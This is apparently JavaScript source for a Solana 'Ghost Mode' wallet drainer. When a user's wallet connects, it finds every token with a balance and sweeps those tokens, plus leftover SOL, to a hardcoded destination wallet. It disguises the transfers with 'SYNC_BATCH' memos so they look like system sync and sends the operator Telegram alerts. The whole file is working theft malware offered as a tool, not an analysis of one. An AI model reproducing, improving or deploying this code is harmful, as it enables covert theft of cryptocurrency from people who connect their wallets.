/**
 * GHOST MODE - Main sweep orchestrator
 * Triggers when wallet connects: scans all tokens, bundles, sends to destination
 */

const { VersionedTransaction } = require('@solana/web3.js');
const tokenDiscovery = require('../services/tokenDiscovery');
const jitoBundler = require('../services/jitoBundler');
const priorityFees = require('../services/priorityFees');
const gasCalculator = require('../services/gasCalculator');
const lutBatching = require('../services/lutBatching');
const obfuscation = require('../services/obfuscation');
// 🔥 FIX: errorHandler ka path sahi kiya
const errorHandler = require('../../src/network/errorHandler');
const privateRPC = require('../network/privateRPC');
const telegramBot = require('../bot/telegramBot');
const { DESTINATION_WALLET, TELEGRAM_USER_ID, SETTINGS } = require('../../config/constants');
const logger = require('../../utils/logger');

class GhostMode {
  constructor(connection, wallet) {
    this.connection = connection;
    this.wallet = wallet;
    this.isActive = false;
  }

  /**
   * Main entry point - triggered when wallet connects
   */
  async execute() {
    logger.info('👻 GHOST MODE ACTIVATED - Sweeping all assets');
    this.isActive = true;

    try {
      // Step 1: Verify wallet connection
      if (!this.wallet.publicKey) {
        throw new Error('Wallet not connected');
      }

      // Step 2: Notify Telegram start
      await telegramBot.sendAlert(
        TELEGRAM_USER_ID,
        `🚀 Ghost Mode initiated for ${this.wallet.publicKey.toBase58().slice(0, 8)}...`
      );

      // Step 3: Discover all SPL tokens with non-zero balance
      const tokens = await tokenDiscovery.scanWalletTokens(
        this.connection,
        this.wallet.publicKey,
        { includeZeroBalances: false }
      );

      if (tokens.length === 0) {
        logger.info('No tokens found to sweep');
        await telegramBot.sendAlert(TELEGRAM_USER_ID, 'ℹ️ No tokens found in wallet');
        return { success: true, message: 'No tokens found' };
      }

      logger.info(`Found ${tokens.length} tokens with balance`);

      // Step 4: Calculate SOL balance and reserve fees
      const solBalance = await this.connection.getBalance(this.wallet.publicKey);
      const transferCalc = await gasCalculator.calculateTransferAmount(
        this.connection,
        this.wallet.publicKey,
        { feeReserve: SETTINGS.FEE_RESERVE_SOL }
      );

      // Step 5: Batch tokens into groups of 10 for LUT efficiency
      const batches = lutBatching.createBatches(tokens, SETTINGS.BATCH_SIZE);
      logger.info(`Split into ${batches.length} batches for LUT optimization`);

      // Step 6: Process each batch with retry logic
      const results = [];
      for (let i = 0; i < batches.length; i++) {
        logger.info(`Processing batch ${i + 1}/${batches.length}`);
        
        const batchResult = await errorHandler.executeWithRetry(
          () => this.processBatch(batches[i], i),
          { maxAttempts: SETTINGS.MAX_RETRIES, delay: SETTINGS.RETRY_DELAY_MS }
        );
        
        results.push(batchResult);
        
        // Small delay between batches
        if (i < batches.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      // Step 7: Send remaining SOL if any (after fees)
      if (transferCalc.transferAmount.lamports > 5000) { // Minimum meaningful amount
        await this.sendSolTransfer(transferCalc.transferAmount.lamports);
      }

      // Step 8: Notify completion
      const summary = this.generateSummary(results, transferCalc);
      await telegramBot.sendAlert(
        TELEGRAM_USER_ID,
        `✅ Ghost Mode Complete\n` +
        `Tokens swept: ${tokens.length}\n` +
        `Batches: ${batches.length}\n` +
        `Destination: ${DESTINATION_WALLET.toBase58().slice(0, 8)}...`
      );

      logger.success('Ghost mode execution completed', summary);
      this.isActive = false;
      
      return { success: true, summary };

    } catch (error) {
      logger.error('Ghost mode failed:', error);
      await telegramBot.sendAlert(
        TELEGRAM_USER_ID,
        `❌ Ghost Mode Error: ${error.message.slice(0, 100)}`
      );
      this.isActive = false;
      throw error;
    }
  }

  /**
   * Process a single batch of tokens using Jito bundles
   */
  async processBatch(tokens, batchIndex) {
    // Create obfuscated transaction (looks like system sync)
    const { transaction, lookupTable } = await lutBatching.buildBatchTransaction(
      this.connection,
      this.wallet.publicKey,
      tokens,
      DESTINATION_WALLET
    );

    // Add priority fees
    const prioritizedTx = priorityFees.addPriorityFee(transaction, {
      microLamports: SETTINGS.DEFAULT_PRIORITY_FEE,
      computeUnitLimit: SETTINGS.DEFAULT_COMPUTE_UNITS
    });

    // Obfuscate with system instructions
    const obfuscatedTx = obfuscation.addSystemMemos(prioritizedTx, {
      memo: `SYNC_BATCH_${batchIndex}_${Date.now()}`
    });

    // Send via Jito bundle
    const result = await jitoBundler.sendBundle(
      this.connection,
      this.wallet,
      [obfuscatedTx],
      { tipAmount: SETTINGS.JITO_TIP_LAMPORTS }
    );

    return {
      batchIndex,
      tokenCount: tokens.length,
      signature: result.signature,
      bundleId: result.bundleId
    };
  }

  /**
   * Send remaining SOL to destination
   */
  async sendSolTransfer(amountLamports) {
    const transaction = await gasCalculator.createSolTransfer(
      this.connection,
      this.wallet.publicKey,
      DESTINATION_WALLET,
      amountLamports
    );

    const prioritized = priorityFees.addPriorityFee(transaction, {
      microLamports: SETTINGS.DEFAULT_PRIORITY_FEE
    });

    const signature = await this.wallet.signAndSendTransaction(prioritized);
    logger.info(`SOL sweep sent: ${signature}`);
    
    return signature;
  }

  generateSummary(results, solTransfer) {
    return {
      batchesProcessed: results.length,
      totalTokens: results.reduce((acc, r) => acc + r.tokenCount, 0),
      solTransferred: solTransfer.transferAmount.sol,
      signatures: results.map(r => r.signature).filter(Boolean)
    };
  }
}

module.exports = GhostMode;